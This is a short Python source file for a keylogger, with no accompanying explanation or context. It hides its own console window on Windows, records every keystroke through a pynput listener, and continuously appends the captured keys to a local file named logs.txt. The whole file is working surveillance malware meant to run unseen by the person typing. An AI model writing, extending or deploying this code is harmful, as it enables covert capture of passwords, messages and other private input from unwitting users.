import pynput.keyboard
import threading
import os
import sys

log = ""

def hide():
    # Hide the console window (works on Windows)
    import ctypes
    whnd = ctypes.windll.kernel32.GetConsoleWindow()
    if whnd != 0:
        ctypes.windll.user32.ShowWindow(whnd, 0)

def on_press(key):
    global log
    try:
        log += str(key.char)
    except AttributeError:
        if key == key.space:
            log += " "
        else:
            log += " [" + str(key) + "] "

def write_file():
    global log
    while True:
        if len(log) > 0:
            with open("logs.txt", "a") as f:
                f.write(log)
            log = ""

def start():
    hide()
    listener = pynput.keyboard.Listener(on_press=on_press)
    listener.start()
    writer = threading.Thread(target=write_file)
    writer.start()

if __name__ == "__main__":
    start()
